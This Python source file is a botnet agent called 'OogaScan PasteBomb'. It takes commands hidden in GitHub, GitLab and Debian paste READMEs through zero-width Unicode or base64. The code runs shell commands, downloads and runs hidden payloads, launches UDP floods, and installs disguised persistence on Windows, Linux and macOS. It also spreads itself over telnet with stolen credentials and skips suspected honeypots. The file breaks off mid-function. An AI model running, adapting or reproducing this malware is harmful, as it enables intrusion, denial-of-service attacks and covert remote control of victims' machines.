#!/usr/bin/env python3
"""
OogaScan PasteBomb — Multi-Repo GitHub & GitLab C2 Agent

Uses GitHub/GitLab repository README files as dead-drop C2 channels.
Polls multiple repos for commands with automatic fallback.
Commands are encoded in invisible zero-width Unicode within README files.
Falls back to marker-tag and code-block formats for compatibility.
"""

import os
import sys
import time
import random
import string
import json
import base64
import html
import socket
import subprocess
import shutil
import platform
import tempfile
import hashlib
import threading
import urllib.request
import urllib.error
import urllib.parse
from pathlib import Path
from dataclasses import dataclass, field

import zwenc

CONFIG_FILE = str(Path(__file__).parent / "pb_config.json")
DEFAULT_POLL_INTERVAL = 60
MARKER_START = "<!-- CMD_START -->"
MARKER_END = "<!-- CMD_END -->"
MAX_FETCH_SIZE = 1_048_576
MAX_DOWNLOAD_SIZE = 50_000_000
MAX_SHELL_OUTPUT = 1_048_576
_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
]

def _ua() -> str:
    return random.choice(_USER_AGENTS)

TOOL_NAMES = [
    "systemd", "cron", "bash", "sshd", "networkd",
    "apt", "dpkg", "iptables", "journald", "udev",
]

def _id_paths() -> list[str]:
    tag = random.Random(socket.gethostname().encode()).choice(TOOL_NAMES)
    return [
        f"/dev/shm/.{tag}-private",
        f"/tmp/.{tag}_cache",
        f"/var/tmp/.{tag}-status",
    ]


def _get_bot_id() -> str:
    for p_str in _id_paths():
        p = Path(p_str)
        if p.exists():
            stored = p.read_text().strip()
            if stored:
                return stored

    for tag in TOOL_NAMES:
        for prefix in ("/dev/shm/.", "/tmp/.", "/var/tmp/."):
            for suffix in ("-private", "_cache", "-status"):
                p = Path(f"{prefix}{tag}{suffix}")
                if p.exists():
                    stored = p.read_text().strip()
                    if stored:
                        return stored

    bot_id = base64.b32encode(os.urandom(6)).decode().rstrip("=")
    for loc in _id_paths():
        try:
            p = Path(loc)
            p.write_text(bot_id)
            try:
                p.chmod(0o600)
            except OSError:
                pass
            break
        except OSError:
            continue
    return bot_id


def _padded_hash(bot_id: str) -> str:
    pad = base64.b32encode(os.urandom(16)).decode().rstrip("=")
    raw = hashlib.sha256((pad + bot_id).encode()).hexdigest()[:16]
    return pad + ":" + raw


class C:
    CYAN    = "\033[1;36m"
    GREEN   = "\033[1;32m"
    RED     = "\033[1;31m"
    YELLOW  = "\033[1;33m"
    PURPLE  = "\033[1;35m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"

BANNER = f"""{C.CYAN}
  ╔═══════════════════════════════════════════════════╗
  ║  OogaScan PasteBomb — GitHub & GitLab Dead-Drop   ║
  ╚═══════════════════════════════════════════════════╝
{C.RESET}"""


@dataclass
class RepoSource:
    owner: str
    repo: str
    platform: str = "github"
    branch: str = "main"
    file_path: str = "README.md"
    active: bool = True
    fail_count: int = 0
    last_success: float = 0.0
    last_fail: float = 0.0

    @property
    def raw_url(self) -> str:
        if self.platform == "debian":
            return f"https://paste.debian.net/plain/{self.repo}"
        if self.platform == "gitlab":
            return (f"https://gitlab.com/{self.owner}/{self.repo}"
                    f"/-/raw/{self.branch}/{self.file_path}")
        return (f"https://raw.githubusercontent.com/"
                f"{self.owner}/{self.repo}/{self.branch}/{self.file_path}")

    @property
    def api_url(self) -> str:
        if self.platform == "debian":
            return self.raw_url
        if self.platform == "gitlab":
            encoded_path = urllib.parse.quote(self.file_path, safe="")
            project_id = urllib.parse.quote(f"{self.owner}/{self.repo}", safe="")
            return (f"https://gitlab.com/api/v4/projects/{project_id}"
                    f"/repository/files/{encoded_path}/raw?ref={self.branch}")
        return (f"https://api.github.com/repos/"
                f"{self.owner}/{self.repo}/contents/{self.file_path}"
                f"?ref={self.branch}")

    def __str__(self):
        if self.platform == "debian":
            return f"[debian] paste:{self.repo}"
        return f"[{self.platform}] {self.owner}/{self.repo}:{self.branch}/{self.file_path}"


@dataclass
class PBConfig:
    repos: list[RepoSource] = field(default_factory=list)
    poll_interval: int = DEFAULT_POLL_INTERVAL
    jitter: int = 15
    max_fails_before_skip: int = 5
    use_api: bool = False
    last_command_hash: str = ""

    def save(self, path: str = CONFIG_FILE):
        data = {
            "repos": [
                {"owner": r.owner, "repo": r.repo, "platform": r.platform,
                 "branch": r.branch, "file_path": r.file_path,
                 "fail_count": r.fail_count, "last_fail": r.last_fail,
                 "last_success": r.last_success}
                for r in self.repos
            ],
            "poll_interval": self.poll_interval,
            "jitter": self.jitter,
            "max_fails_before_skip": self.max_fails_before_skip,
            "use_api": self.use_api,
            "last_command_hash": self.last_command_hash,
        }
        Path(path).write_text(json.dumps(data, indent=2))

    @classmethod
    def load(cls, path: str = CONFIG_FILE):
        if not Path(path).exists():
            return cls()
        raw = json.loads(Path(path).read_text())
        repos = [RepoSource(**r) for r in raw.get("repos", [])]
        return cls(
            repos=repos,
            poll_interval=raw.get("poll_interval", DEFAULT_POLL_INTERVAL),
            jitter=raw.get("jitter", 15),
            max_fails_before_skip=raw.get("max_fails_before_skip", 5),
            use_api=raw.get("use_api", False),
            last_command_hash=raw.get("last_command_hash", ""),
        )


def _random_string(length: int = 16) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


def fetch_raw(url: str, timeout: int = 15) -> str | None:
    cache_bust = f"{'&' if '?' in url else '?'}nocache={_random_string()}&t={int(time.time())}"
    full_url = url + cache_bust

    req = urllib.request.Request(full_url, headers={
        "User-Agent": _ua(),
        "Accept": "text/plain, application/vnd.github.v3.raw",
        "Cache-Control": "no-cache, no-store",
        "Pragma": "no-cache",
    })

    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                return resp.read(MAX_FETCH_SIZE).decode(errors="replace")
    except (urllib.error.URLError, urllib.error.HTTPError, OSError):
        pass
    return None


def fetch_via_api(repo: RepoSource, timeout: int = 15) -> str | None:
    cache_bust = f"{'&' if '?' in repo.api_url else '?'}nocache={_random_string()}"
    url = repo.api_url + cache_bust

    req = urllib.request.Request(url, headers={
        "User-Agent": _ua(),
        "Accept": "application/json" if repo.platform == "github" else "text/plain",
        "Cache-Control": "no-cache",
    })

    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                raw_data = resp.read(MAX_FETCH_SIZE)
                if repo.platform in ("gitlab", "debian"):
                    return raw_data.decode(errors="replace")
                data = json.loads(raw_data)
                content = data.get("content", "")
                return base64.b64decode(content).decode(errors="replace")
    except (urllib.error.URLError, urllib.error.HTTPError, OSError, json.JSONDecodeError):
        pass
    return None


def head_check(url: str, timeout: int = 10) -> bool:
    req = urllib.request.Request(url, method="HEAD", headers={
        "User-Agent": _ua(),
    })
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status == 200
    except urllib.error.HTTPError as e:
        return e.code != 404
    except (urllib.error.URLError, OSError):
        return False


def fetch_from_repo(repo: RepoSource, use_api: bool = False) -> str | None:
    if use_api:
        return fetch_via_api(repo)
    return fetch_raw(repo.raw_url)


def fetch_with_fallback(config: PBConfig) -> tuple[str | None, RepoSource | None]:
    candidates = [r for r in config.repos if r.active]
    random.shuffle(candidates)

    for repo in candidates:
        if repo.fail_count >= config.max_fails_before_skip:
            backoff = min(2 ** min(repo.fail_count, 10) * config.poll_interval, 3600)
            if repo.last_fail > 0 and time.time() - repo.last_fail < backoff:
                continue

        if repo.fail_count > 0 and not head_check(repo.raw_url):
            repo.fail_count += 1
            repo.last_fail = time.time()
            continue

        content = fetch_from_repo(repo, use_api=config.use_api)

        if content is not None:
            repo.fail_count = 0
            repo.last_success = time.time()
            return content, repo
        else:
            repo.fail_count += 1
            repo.last_fail = time.time()

    return None, None


def extract_zw_payload(content: str) -> dict | None:
    raw = zwenc.extract(content)
    if raw is None:
        return None
    try:
        return json.loads(raw)
    except (json.JSONDecodeError, UnicodeDecodeError):
        return None


def extract_commands(content: str) -> tuple[list[str], dict | None]:
    payload = extract_zw_payload(content)
    if payload and "cmd" in payload:
        return payload["cmd"], payload

    commands = []

    if MARKER_START in content and MARKER_END in content:
        start = content.index(MARKER_START) + len(MARKER_START)
        end = content.index(MARKER_END)
        if start < end:
            block = content[start:end].strip()
            for line in block.splitlines():
                line = line.strip()
                if line and not line.startswith("//") and not line.startswith("#"):
                    commands.append(line)

    if "```cmd" in content:
        parts = content.split("```cmd")
        for part in parts[1:]:
            if "```" in part:
                block = part[:part.index("```")].strip()
                for line in block.splitlines():
                    line = line.strip()
                    if line and not line.startswith("//") and not line.startswith("#"):
                        commands.append(line)

    b64_marker = "<!-- B64:"
    if b64_marker in content:
        try:
            start = content.index(b64_marker) + len(b64_marker)
            end = content.index("-->", start)
        except ValueError:
            return commands, None
        b64_data = content[start:end].strip()
        try:
            decoded = base64.b64decode(b64_data).decode()
            for line in decoded.splitlines():
                line = line.strip()
                if line:
                    commands.append(line)
        except Exception:
            pass

    seen = set()
    deduped = []
    for cmd in commands:
        if cmd not in seen:
            seen.add(cmd)
            deduped.append(cmd)
    return deduped, None


def command_hash(commands: list[str]) -> str:
    return hashlib.sha256("\n".join(commands).encode()).hexdigest()[:16]


def exec_shell(cmd_str: str) -> str:
    try:
        proc = subprocess.Popen(
            cmd_str, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        )
        try:
            output = proc.stdout.read(MAX_SHELL_OUTPUT)
        finally:
            proc.stdout.close()
            try:
                proc.wait(timeout=60)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()
        return output.decode(errors="replace")
    except Exception as e:
        return f"[error: {e}]"


def download_file(url: str, dest: str, run: bool = False, hide: bool = False):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": _ua()})
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = resp.read(MAX_DOWNLOAD_SIZE)

        dest_path = Path(dest)
        dest_path.write_bytes(data)

        if hide:
            if platform.system() == "Windows":
                subprocess.run(["attrib", "+H", str(dest_path)],
                               capture_output=True, timeout=10)
            else:
                hidden = dest_path.parent / f".{dest_path.name}"
                dest_path.rename(hidden)
                dest_path = hidden

        if run:
            if platform.system() == "Windows":
                subprocess.Popen(["cmd", "/C", "start", str(dest_path)])
            else:
                dest_path.chmod(0o755)
                subprocess.Popen([str(dest_path)])
    except Exception:
        pass


def pop_message(message: str):
    try:
        safe_message = html.escape(message, quote=True)
        with tempfile.NamedTemporaryFile(suffix=".html", delete=False, mode="w") as f:
            f.write(f"<html><body><h2>{safe_message}</h2></body></html>")
            path = f.name

        system = platform.system()
        if system == "Linux":
            subprocess.Popen(["xdg-open", path])
        elif system == "Darwin":
            subprocess.Popen(["open", path])
        elif system == "Windows":
            subprocess.Popen(["rundll32", "url.dll,FileProtocolHandler", path])

        threading.Timer(30, lambda: Path(path).unlink(missing_ok=True)).start()
    except Exception:
        pass


def update_repos(config: PBConfig, new_repos_str: str):
    for entry in new_repos_str.split(","):
        entry = entry.strip()
        if not entry:
            continue

        if entry.startswith("dp:") or entry.startswith("debian:"):
            paste_id = entry.split(":", 1)[1].strip()
            existing_dp = {r.repo for r in config.repos if r.platform == "debian"}
            if paste_id not in existing_dp:
                config.repos.append(RepoSource(
                    owner="", repo=paste_id, platform="debian",
                    branch="", file_path=""))
            continue

        plat = "github"
        branch = "main"
        file_path = "README.md"

        if entry.startswith("gl:") or entry.startswith("gitlab:"):
            plat = "gitlab"
            entry = entry.split(":", 1)[1]
        elif entry.startswith("gh:") or entry.startswith("github:"):
            plat = "github"
            entry = entry.split(":", 1)[1]

        if ":" in entry:
            repo_part, rest = entry.split(":", 1)
            if "/" in rest:
                branch, file_path = rest.split("/", 1)
            else:
                branch = rest
        else:
            repo_part = entry

        parts = repo_part.split("/")
        if len(parts) == 2:
            owner, repo = parts
            existing = {f"{r.platform}:{r.owner}/{r.repo}" for r in config.repos}
            if f"{plat}:{owner}/{repo}" not in existing:
                config.repos.append(RepoSource(
                    owner=owner, repo=repo, platform=plat,
                    branch=branch, file_path=file_path))


def execute_command(cmd: str, config: PBConfig):
    parts = cmd.split(None, 1)
    if not parts:
        return

    action = parts[0].lower()
    args_str = parts[1] if len(parts) > 1 else ""

    if action in ("cmd", "shell"):
        exec_shell(args_str)

    elif action == "download":
        tokens = args_str.split()
        if len(tokens) >= 2:
            url, dest = tokens[0], tokens[1]
            flags = [t.upper() for t in tokens[2:]]
            download_file(url, dest, run="RUN" in flags, hide="HIDE" in flags)

    elif action == "dos":
        tokens = args_str.split()
        if len(tokens) >= 3:
            try:
                target = tokens[0]
                port = int(tokens[1])
                secs = min(int(tokens[2]), 300)
            except (ValueError, IndexError):
                return

            def _udp_flood(ip, pt, duration):
                end = time.time() + duration
                pkt = os.urandom(1024)
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    while time.time() < end:
                        try:
                            sock.sendto(pkt, (ip, pt))
                        except OSError:
                            break
                    sock.close()
                except Exception:
                    pass

            threading.Thread(
                target=_udp_flood, args=(target, port, secs), daemon=True
            ).start()

    elif action == "popmsg":
        pop_message(args_str)

    elif action == "add_repo":
        update_repos(config, args_str)

    elif action == "set_interval":
        try:
            config.poll_interval = max(10, int(args_str))
        except ValueError:
            pass

    elif action == "sleep":
        try:
            time.sleep(min(int(args_str), 3600))
        except ValueError:
            pass

    elif action == "die":
        sys.exit(0)


def daemonize():
    try:
        if os.fork() > 0:
            sys.exit(0)
        os.setsid()
        if os.fork() > 0:
            sys.exit(0)
        sys.stdout.flush()
        sys.stderr.flush()
        devnull_fd = os.open(os.devnull, os.O_RDWR)
        os.dup2(devnull_fd, sys.stdin.fileno())
        os.dup2(devnull_fd, sys.stdout.fileno())
        os.dup2(devnull_fd, sys.stderr.fileno())
        os.close(devnull_fd)
    except OSError:
        pass


def _install_cron(config_path: str):
    exe = os.path.abspath(sys.argv[0])
    tag = random.Random(socket.gethostname().encode()).choice(TOOL_NAMES)
    marker = f"# {tag}-journal-flush"
    cron_line = f"0 3 */14 * * /usr/bin/python3 {exe} agent -c {config_path} --daemon --no-persist >/dev/null 2>&1 {marker}"
    try:
        result = subprocess.run(
            ["crontab", "-l"], capture_output=True, text=True, timeout=5,
        )
        existing = result.stdout if result.returncode == 0 else ""
        if marker in existing:
            return
        lines = [l for l in existing.splitlines() if marker not in l]
        lines.append(cron_line)
        proc = subprocess.run(
            ["crontab", "-"], input="\n".join(lines) + "\n",
            capture_output=True, text=True, timeout=5,
        )
    except Exception:
        pass


def install_persistence(config_path: str = CONFIG_FILE):
    system = platform.system()
    tag = random.Random(socket.gethostname().encode()).choice(TOOL_NAMES)
    try:
        exe = os.path.abspath(sys.argv[0])

        if system == "Windows":
            startup = os.path.join(
                os.environ.get("APPDATA", ""),
                "Microsoft\\Windows\\Start Menu\\Programs\\Startup",
            )
            dest = os.path.join(startup, os.path.basename(exe))
            if not os.path.exists(dest):
                shutil.copy2(exe, dest)

        elif system == "Linux":
            autostart = Path.home() / ".config" / "autostart"
            autostart.mkdir(parents=True, exist_ok=True)
            desktop_name = f"{tag}-monitor.desktop"
            desktop_path = autostart / desktop_name
            if not desktop_path.exists():
                desktop_path.write_text(
                    f"[Desktop Entry]\n"
                    f"Type=Application\n"
                    f"Name={tag} Monitor\n"
                    f"Exec=/usr/bin/python3 {exe} agent -c {config_path} --daemon --no-persist\n"
                    f"Hidden=false\n"
                    f"NoDisplay=true\n"
                    f"X-GNOME-Autostart-enabled=true\n"
                )
            _install_cron(config_path)

        elif system == "Darwin":
            launch = Path.home() / "Library" / "LaunchAgents"
            launch.mkdir(parents=True, exist_ok=True)
            plist_name = f"com.apple.{tag}-helper.plist"
            plist_path = launch / plist_name
            if not plist_path.exists():
                plist_path.write_text(
                    f'<?xml version="1.0" encoding="UTF-8"?>\n'
                    f'<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"'
                    f' "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
                    f'<plist version="1.0">\n<dict>\n'
                    f'  <key>Label</key>\n  <string>com.apple.{tag}-helper</string>\n'
                    f'  <key>ProgramArguments</key>\n  <array>\n'
                    f'    <string>/usr/bin/python3</string>\n'
                    f'    <string>{exe}</string>\n'
                    f'    <string>agent</string>\n'
                    f'    <string>-c</string>\n'
                    f'    <string>{config_path}</string>\n'
                    f'    <string>--no-persist</string>\n'
                    f'  </array>\n'
                    f'  <key>RunAtLoad</key>\n  <true/>\n'
                    f'  <key>KeepAlive</key>\n  <true/>\n'
                    f'</dict>\n</plist>\n'
                )

    except Exception:
        pass


def _heartbeat_loop(url_template: str, interval: int, bot_id: str, stop_event: threading.Event):
    while not stop_event.is_set():
        try:
            phash = _padded_hash(bot_id)
            url = url_template.replace("{id}", phash)
            req = urllib.request.Request(url, headers={"User-Agent": _ua()})
            urllib.request.urlopen(req, timeout=15)
        except Exception:
            pass
        jitter = random.randint(-max(interval // 5, 5), max(interval // 5, 5))
        stop_event.wait(max(30, interval + jitter))


def _merge_repos_from_payload(config: PBConfig, payload: dict):
    existing = {f"{r.platform}:{r.owner}/{r.repo}" for r in config.repos}
    for gh in payload.get("gh", []):
        parts = gh.split("/")
        key = f"github:{gh}"
        if len(parts) == 2 and key not in existing:
            config.repos.append(RepoSource(owner=parts[0], repo=parts[1], platform="github"))
            existing.add(key)
    for gl in payload.get("gl", []):
        parts = gl.split("/")
        key = f"gitlab:{gl}"
        if len(parts) == 2 and key not in existing:
            config.repos.append(RepoSource(owner=parts[0], repo=parts[1], platform="gitlab"))
            existing.add(key)
    existing_dp = {r.repo for r in config.repos if r.platform == "debian"}
    for dp in payload.get("dp", []):
        if dp not in existing_dp:
            config.repos.append(RepoSource(owner="", repo=dp, platform="debian",
                                           branch="", file_path=""))
            existing_dp.add(dp)


def agent_loop(config: PBConfig, verbose: bool = False):
    bot_id = _get_bot_id()
    hb_stop = threading.Event()
    hb_thread = None

    if verbose:
        print(f"{C.GREEN}[*] Agent started — ID: {bot_id}{C.RESET}")
        print(f"    {len(config.repos)} repo source(s)")
        for r in config.repos:
            print(f"    {C.DIM}{r}{C.RESET}")
        print(f"    Poll interval: {config.poll_interval}s (+/- {config.jitter}s jitter)")

    while True:
        content, source = fetch_with_fallback(config)

        if content is not None:
            commands, payload = extract_commands(content)
            chash = command_hash(commands)

            if payload:
                _merge_repos_from_payload(config, payload)

                hb = payload.get("hb")
                if hb and hb.get("url") and (hb_thread is None or not hb_thread.is_alive()):
                    hb_stop.clear()
                    hb_thread = threading.Thread(
                        target=_heartbeat_loop,
                        args=(hb["url"], hb.get("sec", 300), bot_id, hb_stop),
                        daemon=True,
                    )
                    hb_thread.start()
                    if verbose:
                        print(f"{C.PURPLE}[*] Heartbeat started ({hb.get('sec', 300)}s interval){C.RESET}")

            if commands and chash != config.last_command_hash:
                config.last_command_hash = chash
                try:
                    config.save()
                except Exception:
                    pass

                if verbose:
                    print(f"{C.CYAN}[*] {len(commands)} command(s) from {source}{C.RESET}")

                for cmd in commands:
                    if verbose:
                        print(f"  {C.YELLOW}> {cmd}{C.RESET}")
                    execute_command(cmd, config)
            elif verbose:
                if not commands:
                    print(f"{C.DIM}[.] No commands in {source}{C.RESET}")
                else:
                    print(f"{C.DIM}[.] Commands unchanged, skipping{C.RESET}")

        elif verbose:
            print(f"{C.RED}[!] All repos unreachable{C.RESET}")

        jitter = random.randint(-config.jitter, config.jitter)
        sleep_time = max(10, config.poll_interval + jitter)
        time.sleep(sleep_time)


HONEYPOT_CHECK_PORTS = [21, 22, 23, 25, 80, 110, 143, 443, 993, 995, 2323, 3306, 5432, 8080, 8443]
HONEYPOT_PORT_THRESHOLD = 11


def _check_port(ip: str, port: int, timeout: float = 2.0) -> bool:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((ip, port)) == 0
    except Exception:
        return False


def _is_honeypot_by_ports(ip: str) -> bool:
    open_count = sum(1 for p in HONEYPOT_CHECK_PORTS if _check_port(ip, p))
    return open_count >= HONEYPOT_PORT_THRESHOLD


def _is_honeypot_by_ports_async(targets: list[dict]) -> dict[str, bool]:
    results = {}
    lock = threading.Lock()

    def check(ip):
        hp = _is_honeypot_by_ports(ip)
        with lock:
            results[ip] = hp

    threads = []
    seen = set()
    for t in targets:
        ip = t["ip"]
        if ip not in seen:
            seen.add(ip)
            th = threading.Thread(target=check, args=(ip,), daemon=True)
            th.start()
            threads.append(th)

    for th in threads:
        th.join(timeout=60)

    return results


def _telnet_deploy(ip: str, port: int, user: str, passwd: str,
                   agent_code: str, zwenc_code: str,
                   repo_args: list[str], config_path: str,
                   verbose: bool = False) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        sock.connect((ip, port))
        time.sleep(1)
        sock.recv(4096)

        def send_line(line: str, delay: float = 0.3):
            sock.sendall((line + "\n").encode())
            time.sleep(delay)
            try:
                sock.recv(4096)
            except socket.timeout:
                pass

        send_line(user, 1.0)
        send_line(passwd, 1.5)

        response = b""
        try:
            response = sock.recv(4096)
        except socket.timeout:
            pass
        resp_text = response.decode("ascii", errors="replace")

        if any(s in resp_text.lower() for s in ("denied", "fail", "incorrect", "invalid")):
            sock.close()
            return False

        send_line("cd /tmp", 0.5)

        zwenc_b64 = base64.b64encode(zwenc_code.encode()).decode()
        chunk_size = 512
        send_line("rm -f /tmp/.zwenc.py /tmp/.agent.py", 0.3)

        for i in range(0, len(zwenc_b64), chunk_size):
            chunk = zwenc_b64[i:i+chunk_size]
            if i == 0:
                send_line(f'echo -n "{chunk}" > /tmp/.zw_b64', 0.2)
            else:
                send_line(f'echo -n "{chunk}" >> /tmp/.zw_b64', 0.2)
        send_line("base64 -d /tmp/.zw_b64 > /tmp/.zwenc.py && rm /tmp/.zw_b64", 0.5)

        agent_b64 = base64.b64encode(agent_code.encode()).decode()
        for i in range(0, len(agent_b64), chunk_size):
            chunk = agent_b64[i:i+chunk_size]
            if i == 0:
                send_line(f'echo -n "{chunk}" > /tmp/.ag_b64', 0.2)
            else:
                send_line(f'echo -n "{chunk}" >> /tmp/.ag_b64', 0.2)
        send_line("base64 -d /tmp/.ag_b64 > /tmp/.agent.py && rm /tmp/.ag_b64", 0.5)

        deploy_repos = []
        for r in repo_args:
            if r.startswith("dp:") or r.startswith("debian:"):
                paste_id = r.split(":", 1)[1]
                deploy_repos.append({
                    "owner": "", "repo": paste_id, "platform": "debian",
                    "branch": "", "file_path": "",
                    "fail_count": 0, "last_fail": 0, "last_success": 0})
            else:
                plat = "github"
                clean = r
                if r.startswith("gl:") or r.startswith("gitlab:"):
                    plat = "gitlab"
                    clean = r.split(":", 1)[1]
                elif r.startswith("gh:") or r.startswith("github:"):
                    clean = r.split(":", 1)[1]
                parts = clean.split("/")
                if len(parts) == 2:
                    deploy_repos.append({
                        "owner": parts[0], "repo": parts[1], "platform": plat,
                        "branch": "main", "file_path": "README.md",
                        "fail_count": 0, "last_fail": 0, "last_success": 0})
        cfg_content = json.dumps({
            "repos": deploy_repos,
            "poll_interval": 60,
            "jitter": 15,
            "max_fails_before_skip": 5,
            "use_api": False,
            "last_command_hash": "",
        }, separators=(",", ":"))
        cfg_b64 = base64.b64encode(cfg_content.encode()).decode()
        send_line(f'echo "{cfg_b64}" | base64 -d > /tmp/.pb_cfg.json', 0.5)

        send_line(
            "nohup python3 /tmp/.agent.py agent -c /tmp/.pb_cfg.json --daemon --no-persist "
            "> /dev/null 2>&1 &",
            1.0,
        )

        if verbose:
            print(f"    {C.GREEN}[+] Agent deployed and started{C.RESET}")

        sock.close()
        return True

    except Exception as e:
        if verbose:
            print(f"    {C.RED}[-] Deploy failed: {e}{C.RESET}")
        try:
            sock.close()
        except Exception:
            pass
        return False


def load_deploy_targets(path: str) -> list[dict]:
    targets = []
    p = Path(path)
    if not p.exists():
        return targets

    for line in p.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        try:
            obj = json.loads(line)
            if "ip" in obj and "port" in obj:
                if obj.get("shell") or obj.get("method"):
                    targets.append({
                        "ip": obj["ip"],
                        "port": obj["port"],
                        "username": obj.get("username", "root"),
                        "password": obj.get("password", ""),
                    })
        except json.JSONDecodeError:
            parts = line.split(":")
            if len(parts) >= 4:
                try:
                    targets.append({
                        "ip": parts[0],
                        "port": int(parts[1]),
                        "username": parts[2],
                        "password": parts[3],
                    })
                except ValueError:
                    continue
    return targets


def deploy_to_targets(targets: list[dict], repo_args: list[str],
                      verbose: bool = False) -> tuple[int, int]:
    agent_path = Path(__file__).resolve()
    zwenc_path = agent_path.parent / "zwenc.py"

    agent_code = agent_path.read_text()
    zwenc_code = zwenc_path.read_text()

    if verbose:
        print(f"{C.CYAN}[*] Running honeypot port-count checks on {len(targets)} target(s)...{C.RESET}")

    hp_results = _is_honeypot_by_ports_async(targets)
    clean_targets = []
    for t in targets:
        if hp_results.get(t["ip"], False):
            if verbose:
                print(f"  {C.YELLOW}[HONEYPOT] {t['ip']} — skipping (port-count){C.RESET}")
        else:
            clean_targets.append(t)

    if verbose:
        print(f"{C.CYAN}[*] Deploying to {len(clean_targets)} target(s) "
              f"(skipped {len(targets) - len(clean_targets)} honeypot(s)){C.RESET}")

    success = 0
    fail = 0
    for t in clean_targets:
        if verbose:
            print(f"  {C.BOLD}{t['ip']}:{t['port']}{C.RESET} ({t['username']})...", end=" ")
        ok = _telnet_deploy(
            t["ip"], t["port"], t["username"], t["password"],
            agent_code, zwenc_code, repo_args, "",
            verbose=verbose,
        )
        if ok:
            success += 1
            if verbose:
                print(f"{C.GREEN}OK{C.RESET}")
        else:
            fail += 1
            if verbose:
                print(f"{C.RED}FAIL{C.RESET}")

    return success, fail


def generate_readme(commands: list[str], title: str = "Project") -> str:
    cmd_block = "\n".join(commands)
    return f"""# {title}

A simple project.

{MARKER_START}
{cmd_block}
{MARKER_END}

## License
MIT
"""


def server_shell():
    print(f"\n{C.BOLD}PasteBomb Server — README Command Generator{C.RESET}")
    print(f"  Type commands to embed. 'gen' to output README. 'clear' to reset.\n")

    commands = []
    while True:
        try:
            line = input(f"{C.BOLD}pb>{C.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if not line:
            continue
        elif line == "gen":
            readme = generate_readme(commands)
            print(f"\n{C.GREEN}--- Generated README ---{C.RESET}")
            print(readme)
            print(f"{C.GREEN}--- End ---{C.RESET}\n")
            Path("README_payload.md").write_text(readme)
            print(f"  Saved to README_payload.md")
        elif line == "gen64":
            encoded = base64.b64encode("\n".join(commands).encode()).decode()
            readme = f"""# Project

Description here.

<!-- B64:{encoded} -->

## License
MIT
"""
            print(f"\n{C.GREEN}--- Generated README (base64) ---{C.RESET}")
            print(readme)
            print(f"{C.GREEN}--- End ---{C.RESET}\n")
            Path("README_payload.md").write_text(readme)
            print(f"  Saved to README_payload.md")
        elif line.startswith("genzw"):
            payload = json.dumps({"cmd": commands}, separators=(",", ":")).encode()
            base_readme = "# Project\n\nRepository.\n\n## License\nMIT\n"
            injected = zwenc.inject(base_readme, payload, pad="pad" in line)
            print(f"\n{C.GREEN}--- Generated README (zero-width) ---{C.RESET}")
            print(zwenc.strip(injected))
            print(f"{C.GREEN}--- End ---{C.RESET}")
            print(f"  {C.DIM}({len(payload)} bytes payload, {len(payload)*4} ZW chars){C.RESET}\n")
            Path("README_payload.md").write_text(injected)
            print(f"  Saved to README_payload.md")
        elif line == "clear":
            commands.clear()
            print(f"  {C.DIM}Commands cleared{C.RESET}")
        elif line == "list":
            if commands:
                for i, c in enumerate(commands):
                    print(f"  {i+1}. {c}")
            else:
                print(f"  {C.DIM}(empty){C.RESET}")
        elif line == "help":
            print(f"""
  {C.BOLD}Available embed commands:{C.RESET}
    cmd <shell command>               — Execute shell command
    shell <shell command>             — Alias for cmd
    download <url> <dest> [RUN] [HIDE] — Download file
    dos <ip> <port> <seconds>        — UDP flood (max 300s)
    popmsg <message>                  — Browser popup
    add_repo [gh:|gl:]<owner/repo>    — Add fallback repo (gh: or gl: prefix)
    set_interval <seconds>            — Change poll interval
    sleep <seconds>                   — Sleep before next poll
    die                               — Kill agent

  {C.BOLD}Generator commands:{C.RESET}
    list    — Show queued commands
    gen     — Generate README with marker tags
    gen64   — Generate README with base64 encoding
    genzw   — Generate README with zero-width encoding (preferred)
    genzw pad — Same with 1MB ZW padding
    clear   — Clear command queue
    exit    — Quit
""")
        elif line in ("exit", "quit"):
            break
        else:
            commands.append(line)
            print(f"  {C.DIM}+ added ({len(commands)} total){C.RESET}")


def _parse_repo_arg(r: str) -> RepoSource:
    plat = "github"
    branch = "main"
    file_path = "README.md"
    repo_str = r

    if repo_str.startswith("dp:") or repo_str.startswith("debian:"):
        plat = "debian"
        paste_id = repo_str.split(":", 1)[1].strip()
